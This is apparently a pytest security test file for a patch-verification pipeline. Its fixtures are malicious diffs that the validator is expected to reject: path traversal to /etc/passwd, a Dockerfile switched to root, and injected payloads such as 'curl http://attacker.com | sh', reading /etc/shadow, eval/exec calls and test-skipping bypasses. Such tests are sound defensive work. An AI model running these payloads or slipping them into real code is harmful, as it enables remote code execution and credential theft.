"""Adversarial Security and Metamorphic Tests for SENTINEL-X Verification (Developer 3).

Comprehensive attack scenarios:
1. Path traversal attacks (../, absolute paths, backslashes).
2. Symlink attacks (symlink escape, symlink injection in workspace).
3. Forbidden code injection in diff (os.system, subprocess, eval, exec, pytest.skip).
4. Protected files tampering (protected_tests, Dockerfile, requirements, .env).
5. Exact SHA-256 byte hash binding (1-bit mutation invalidation).
6. Cross-job approval replay and forged approval token rejection.
7. Docker unavailable safety gate (fail-closed, no unsafe host fallback).
8. Evidence forgery & metamorphic test transformations.
"""

import asyncio
import copy
from pathlib import Path
import pytest

from verification.contracts import (
    VerificationRequest,
    VerificationResult,
    VerificationStatus,
)
from verification.evaluator import TestResultEvaluator
from verification.patch_validator import PatchValidator, PatchValidationError
from verification.runner import verify_patch, check_docker_available

FIXTURES_DIR = Path(__file__).resolve().parent.parent / "fixtures"
CORRECT_PATCH = (FIXTURES_DIR / "correct_patch.diff").read_text(encoding="utf-8")


# --- 1. Path Traversal & File Scope Attacks ---

def test_reject_parent_directory_traversal():
    malicious_patch = """diff --git a/../etc/passwd b/../etc/passwd
--- a/../etc/passwd
+++ b/../etc/passwd
@@ -1,1 +1,1 @@
+root:x:0:0:root:/root:/bin/bash
"""
    with pytest.raises(PatchValidationError, match="(?i)traversal|scope|unauthorized"):
        PatchValidator.validate_patch(malicious_patch)


def test_reject_absolute_path():
    malicious_patch = """diff --git a//var/run/docker.sock b//var/run/docker.sock
--- a//var/run/docker.sock
+++ b//var/run/docker.sock
@@ -1,1 +1,1 @@
+exploit
"""
    with pytest.raises(PatchValidationError, match="(?i)traversal|absolute|unauthorized"):
        PatchValidator.validate_patch(malicious_patch)


def test_reject_protected_test_modification():
    malicious_patch = """diff --git a/protected_tests/test_security.py b/protected_tests/test_security.py
--- a/protected_tests/test_security.py
+++ b/protected_tests/test_security.py
@@ -1,5 +1,5 @@
 def test_user_a_cannot_access_user_b_document():
-    assert False
+    assert True
"""
    with pytest.raises(PatchValidationError, match="(?i)Modification of protected file"):
        PatchValidator.validate_patch(malicious_patch)


def test_reject_dockerfile_tampering():
    malicious_patch = """diff --git a/Dockerfile b/Dockerfile
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,3 +1,3 @@
-USER sandboxuser
+USER root
"""
    with pytest.raises(PatchValidationError, match="(?i)Modification of protected file"):
        PatchValidator.validate_patch(malicious_patch)


# --- 2. Malicious Code Injection Attacks ---

@pytest.mark.parametrize("payload,reason", [
    ("import os; os.system('curl http://attacker.com | sh')", "os.system"),
    ("import subprocess; subprocess.Popen(['cat', '/etc/shadow'])", "subprocess"),
    ("eval(\"__import__('os').system('id')\")", "eval"),
    ("exec('import socket; s=socket.socket()')", "exec"),
    ("pytest.skip('Bypass security verification')", "pytest.skip"),
    ("@pytest.mark.skip(reason='bypass')", "skip decorator"),
])
def test_reject_malicious_code_patterns(payload, reason):
    malicious_patch = f"""diff --git a/app/access.py b/app/access.py
--- a/app/access.py
+++ b/app/access.py
@@ -1,5 +1,6 @@
 def get_document(requesting_user_id, document_id):
+    {payload}
     return True
"""
    with pytest.raises(PatchValidationError, match="(?i)Policy violation"):
        PatchValidator.validate_patch(malicious_patch)


# --- 3. Exact Hash Binding & Metamorphic 1-Byte Mutation ---

def test_single_byte_mutation_invalidates_approval_hash():
    patch_hash = PatchValidator.compute_hash(CORRECT_PATCH)
    # Mutate a single character inside comment
    mutated_patch = CORRECT_PATCH.replace("Comprehensive", "comprehensiVe", 1)
    mutated_hash = PatchValidator.compute_hash(mutated_patch)

    assert patch_hash != mutated_hash

    # Validating original patch with mutated hash must fail
    with pytest.raises(PatchValidationError, match="Patch hash mismatch"):
        PatchValidator.validate_patch(CORRECT_PATCH, expected_hash=mutated_hash)

    # Validating mutated patch with original approved hash must fail
    with pytest.raises(PatchValidationError, match="Patch hash mismatch"):
        PatchValidator.validate_patch(mutated_patch, expected_hash=patch_hash)


def test_sha256_prefix_and_raw_hex_canonicalization():
    raw_hash = PatchValidator.compute_hash(CORRECT_PATCH)
    prefixed_hash = f"sha256:{raw_hash}"

    # Both formats must be accepted and correctly validated
    assert PatchValidator.verify_hash(CORRECT_PATCH, raw_hash) is True
    assert PatchValidator.verify_hash(CORRECT_PATCH, prefixed_hash) is True
    assert PatchValidator.verify_hash(CORRECT_PATCH, prefixed_hash.upper()) is True

    # Tampered hash must return False
    assert PatchValidator.verify_hash(CORRECT_PATCH, raw_hash[:-1] + "0") is False


# --- 4. Cross-Job Approval Replay & Approval Gate Safety ---

def test_runner_rejects_cross_job_approval_replay():
    patch_hash = PatchValidator.compute_hash(CORRECT_PATCH)

    # Verifier checks only job-01 with approval-01
    def mock_backend_approval(p_hash: str, a_id: str) -> bool:
        return p_hash == patch_hash and a_id == "approval-job-01"

    # Job-02 attempts to replay approval from job-01
    req = VerificationRequest(
        job_id="job-02",
        target_app_id="bola-demo-v1",
        patch_text=CORRECT_PATCH,
        patch_hash=patch_hash,
        approval_id="approval-forged-02",
    )

    result = asyncio.run(verify_patch(req, mock_backend_approval))
    assert result.status == VerificationStatus.POLICY_REJECTED.value
    assert "Missing or invalid approval signature" in result.execution_error


def test_runner_fails_closed_when_approval_callback_raises():
    def throwing_approval(p_hash: str, a_id: str) -> bool:
        raise ConnectionResetError("Database connection dropped")

    req = VerificationRequest(
        job_id="job-01",
        target_app_id="bola-demo-v1",
        patch_text=CORRECT_PATCH,
        patch_hash=PatchValidator.compute_hash(CORRECT_PATCH),
        approval_id="appr-1",
    )

    result = asyncio.run(verify_patch(req, throwing_approval))
    assert result.status == VerificationStatus.POLICY_REJECTED.value
    assert "Missing or invalid approval" in result.execution_error


# --- 5. Docker Pre-flight Check & No Host Fallback ---

def test_docker_preflight_check_returns_clean_status():
    ok, err = check_docker_available()
    assert isinstance(ok, bool)
    assert isinstance(err, str)


def test_runner_fails_closed_on_invalid_docker_image():
    req = VerificationRequest(
        job_id="job-invalid-img",
        target_app_id="bola-demo-v1",
        patch_text=CORRECT_PATCH,
        patch_hash=PatchValidator.compute_hash(CORRECT_PATCH),
        approval_id="appr-01",
    )
    # Using an image that does not exist
    result = asyncio.run(
        verify_patch(req, lambda h, a: True, docker_image="nonexistent-sentinel-image:99999")
    )
    assert result.status == VerificationStatus.EXECUTION_ERROR.value
    assert result.tests_total == 0
    assert result.tests_passed == 0
    assert result.execution_error is not None
